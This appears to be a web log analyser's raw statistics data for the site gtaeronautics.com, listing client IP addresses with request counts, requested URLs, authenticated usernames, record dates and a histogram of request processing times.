L	RS	27	9	209.160.119.186
L	RS	132	9	66.249.66.196
L	RS	3092	9	216.244.66.229
L	RS	40	8	104.248.229.153
L	RS	35	7	41.216.188.162
L	RS	24	6	91.92.251.86
L	RS	75	6	52.167.144.57
L	RS	585	5	194.169.175.26
L	RS	15	5	103.252.136.16
L	RS	25	5	45.66.230.189
L	RS	25	5	139.162.31.101
L	RS	5	5	101.43.178.220
L	RS	129	5	66.249.66.72
L	RS	20	5	13.80.8.175
L	RS	20	5	13.80.13.147
L	RS	20	5	52.25.208.208
L	RS	274	4	194.38.22.71
L	RS	542792	259	[not listed: 83291]
K	*FR	2013	12	22	04	20
K	*LR	2023	11	04	10	44
K	*f	-30S	s
K	lRS	1	27	6	http://gtaeronautics.com/admin/
K	lRS	1	246	3	http://www.gtaeronautics.com/uavengines.html
K	lRS	1	3	1	http://gtaeronautics.com/new_license.php
K	lRS	1	120	1	http://gtaeronautics.com/index.php
K	lRS	1	1	1	http://gtaeronautics.com/index.asp
K	lRS	1	3	1	http://gtaeronautics.com/newsleter.php
K	lRS	1	3	1	http://gtaeronautics.com/by.php
K	lRS	1	64485	0	[not listed: 5840]
E	*FR	2008	01	06	10	12
E	*LR	2023	10	25	06	40
E	*f	-30S	s
E	lSR	1	0	218	[not listed: 6]
l	*FR	2008	01	06	10	12
l	*LR	2023	10	25	06	40
l	*f	-20S	s
l	SR	0	218	[not listed: 112]
v	*f	-20B	b
v	Rb	834192	65.103	64.41.87.40
v	Rb	657415	34.897	66.113.131.59
R	*FR	2008	01	06	10	12
R	*LR	2023	10	25	06	40
R	*f	-20R	r
R	R	178	66.113.131.59
R	R	40	64.41.87.40
M	*FR	2007	12	11	00	52
M	*LR	2023	11	05	04	34
M	*f	-20R	r
M	R	302606	66.113.131.59
M	R	245736	64.41.87.40
J	*FR	2007	12	11	00	53
J	*LR	2017	03	17	18	30
J	*f	-20R	r
J	R	9	gtaeronautics
J	R	5	lorrigkj
J	R	1	rullma2063
J	R	1	administrator
J	R	1	satish
J	R	1	nnnnn
P	*FR	2023	09	25	17	34
P	*LR	2023	11	05	04	46
P	R	206	0
P	R	54	<= 0.01
P	R	1590	0.01-0.02
P	R	91433	0.02-0.05
P	R	139655	0.05-0.1 
P	R	186479	0.1 -0.2 
P	R	191291	0.2 -0.5 
P	R	94946	0.5 -1   
P	R	53026	1-  2 
P	R	23346	2-  5 
P	R	10955	5- 10 
P	R	5056	10- 20 
P	R	20508	20- 60 
P	R	3038	60-120 
P	R	12559	120-300 
